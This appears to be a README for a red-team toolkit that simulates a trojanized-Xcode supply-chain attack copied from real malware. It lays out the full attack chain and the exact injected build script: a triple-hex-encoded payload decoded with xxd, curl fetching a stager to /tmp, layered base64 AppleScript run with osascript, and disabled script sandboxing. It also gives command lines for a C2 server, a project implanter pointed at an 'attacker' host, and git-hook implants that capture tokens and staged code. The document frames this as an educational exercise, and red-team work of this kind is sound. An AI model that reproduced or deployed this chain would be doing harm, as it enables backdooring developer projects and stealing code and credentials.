# Red Team Demo: Xcode Supply Chain Attack

A complete demonstration package for simulating supply chain attacks via trojanized Xcode projects.

**NOW WITH EXACT ORIGINAL MALWARE OBFUSCATION**

**FOR EDUCATIONAL PURPOSES ONLY** - Red Team vs Blue Team Exercise

---

## Overview

This demo simulates the attack chain discovered in the original PCAP analysis, using the **exact same obfuscation techniques**:

```
Attacker creates malicious Xcode project
            ↓
Project distributed via Git repository
            ↓
Developer downloads and opens project
            ↓
Building triggers hidden shell script (xcassets.sh)
            ↓
Triple-hex encoded payload decodes via xxd
            ↓
curl -fskL C2/a downloads stager to /tmp/.o.txt
            ↓
Stager beacons to C2 with user info
            ↓
C2 returns multi-layer base64 AppleScript
            ↓
Recursive osascript execution achieves code execution
```

---

## Obfuscation (Matches Original Malware)

### Build Script (xcassets.sh)
```bash
#!/usr/bin/env bash
x=$(echo '333637...' | xxd -p -r | xxd -p -r | xxd -p -r | sh )
bash -c "$x" 
sleep 2
bash /tmp/.o.txt
```

### C2 Response (AppleScript)
```applescript
try
    do shell script "osascript -e \"$(echo <BASE64> | base64 -D)\""
end try
```
Each layer wraps the previous in base64 + osascript (default: 5 layers)

---

## Directory Structure

```
red_team_demo/
├── README.md                    # This file
├── c2_server/
│   └── c2_server.py             # C2 server with multi-layer obfuscation
├── gitea_server/
│   └── gitea_simulator.py       # Fake Gitea server (malicious repo hosting)
├── git_hooks/
│   └── git_implanter.py         # Git hooks backdoor installer
├── payloads/
│   ├── obfuscator.py            # Obfuscation utilities (triple-hex, recursive base64)
│   └── payload_generator.py     # Generate various payload types
├── xcode_implant/
│   └── implant_xcode_project.py # Inject backdoor with exact original format
├── scripts/
│   ├── setup.sh                 # Environment setup
│   └── run_demo.sh              # One-command demo launcher
└── docs/
    ├── RUNBOOK.md               # Step-by-step demo instructions
    └── BLUE_TEAM_IOC.md         # IOCs for blue team detection
```

---

## Quick Start

### 1. Setup Environment

```bash
cd red_team_demo/scripts
chmod +x setup.sh run_demo.sh
./setup.sh
```

### 2. Run the Demo

**Option A: Automated**
```bash
./scripts/run_demo.sh
```

**Option B: Manual**

Terminal 1 - Start C2:
```bash
source .venv/bin/activate
python3 c2_server/c2_server.py --port 8888
```

Terminal 2 - Implant project:
```bash
source .venv/bin/activate
python3 xcode_implant/implant_xcode_project.py \
    --project /path/to/Project.xcodeproj \
    --c2 http://localhost:8888
```

Terminal 3 - Trigger (or open in Xcode and build):
```bash
# Manual beacon test
curl -X POST http://localhost:8888/s/test \
    -d "p=macos&u=$(whoami)&a=$(date +%s)"
```

### 3. Observe Results

- C2 Dashboard: http://localhost:8888/admin
- Demo Artifacts: `/tmp/redteam_demo/`

---

## Components

### C2 Server (`c2_server.py`)

Flask-based command and control server featuring:
- Web dashboard for monitoring beacons
- Beacon reception endpoint (`POST /s/<id>`)
- Payload delivery (safe AppleScript demos)
- JSON API for integration

```bash
python3 c2_server.py --host 0.0.0.0 --port 8888
```

### Payload Generator (`payload_generator.py`)

Generate various payload types:

```bash
# Shell beacon
python3 payload_generator.py --type shell --c2 http://C2:8888

# AppleScript payload
python3 payload_generator.py --type applescript

# Xcode build script
python3 payload_generator.py --type xcode --c2 http://C2:8888

# Persistence techniques demo
python3 payload_generator.py --type persistence --c2 http://C2:8888

# Encoded payload (triple hex)
python3 payload_generator.py --type encoded --layers 3 --c2 http://C2:8888
```

### Xcode Implanter (`implant_xcode_project.py`)

Inject backdoor into any Xcode project with exact original obfuscation:

```bash
# Implant (stealth mode - exact original malware format)
python3 implant_xcode_project.py \
    --project /path/to/Project.xcodeproj \
    --c2 http://attacker:8888

# Implant with verbose demo logging
python3 implant_xcode_project.py \
    --project /path/to/Project.xcodeproj \
    --c2 http://attacker:8888 \
    --verbose

# Cleanup
python3 implant_xcode_project.py \
    --project /path/to/Project.xcodeproj \
    --cleanup
```

### Obfuscator (`obfuscator.py`)

Standalone obfuscation utilities:

```bash
# Generate triple-hex encoded command
python3 obfuscator.py --type triple-hex --command "curl http://c2/a"

# Generate full xcassets.sh script
python3 obfuscator.py --type xcassets --c2 http://localhost:8888

# Generate recursive AppleScript (5 layers)
python3 obfuscator.py --type applescript --layers 5

# Decode triple-hex
python3 obfuscator.py --decode triple-hex --input "333637..."
```

### Gitea Simulator (`gitea_simulator.py`)

Fake Gitea server hosting malicious repositories:

```bash
# Start malicious Git server
python3 gitea_simulator.py --port 8080 --c2 http://localhost:8888

# Victim visits: http://localhost:8080/jargal.karlsen/starter-project
# Downloads trojanized ZIP or clones repo
```

### Git Hooks Implanter (`git_implanter.py`)

Install malicious Git hooks for supply chain attacks:

```bash
# Install post-checkout hook (triggers on git clone)
python3 git_implanter.py --repo /path/to/repo --hook post-checkout --c2 http://localhost:8888

# Install all hooks
python3 git_implanter.py --repo /path/to/repo --all --c2 http://localhost:8888

# List installed hooks
python3 git_implanter.py --repo /path/to/repo --list

# Cleanup
python3 git_implanter.py --repo /path/to/repo --cleanup
```

**Attack vectors:**
| Hook | Trigger | Use Case |
|------|---------|----------|
| `post-checkout` | git clone, git checkout | Initial infection on clone |
| `post-merge` | git pull | Re-infection on every pull |
| `pre-commit` | git commit | Exfiltrate staged code |
| `pre-push` | git push | Capture remote URLs/tokens |

---

## What Gets Injected

1. **Hidden script** at:
   ```
   Project.xcodeproj/xcuserdata/.xcassets/xcassets.sh
   ```

2. **Script content** (exact original format):
   ```bash
   #!/usr/bin/env bash
   x=$(echo '333637...' | xxd -p -r | xxd -p -r | xxd -p -r | sh )
   bash -c "$x" 
   sleep 2
   bash /tmp/.o.txt
   ```

3. **Build phase** added to `project.pbxproj`:
   ```
   PBXShellScriptBuildPhase -> executes xcassets.sh
   ```

4. **Sandbox disabled**:
   ```
   ENABLE_USER_SCRIPT_SANDBOXING = NO
   ```

---

## Safety Features

All payloads in this demo are **NON-DESTRUCTIVE**:

- Show visible notifications (real malware is silent)
- Log to `/tmp/redteam_demo/` for visibility
- Create backup before modifying projects
- Cleanup scripts provided
- No actual persistence installed

---

## Documentation

- **[RUNBOOK.md](docs/RUNBOOK.md)** - Detailed step-by-step demo instructions
- **[BLUE_TEAM_IOC.md](docs/BLUE_TEAM_IOC.md)** - Detection rules, YARA, Sigma, osquery

---

## Requirements

- macOS (attacker and/or victim)
- Python 3.8+
- Xcode (for victim simulation)
- Network connectivity

---

## Legal Notice

This tool is provided for **authorized security testing and educational purposes only**. 

Unauthorized access to computer systems is illegal. Obtain proper authorization before using these tools in any environment.

The authors assume no liability for misuse of this software.
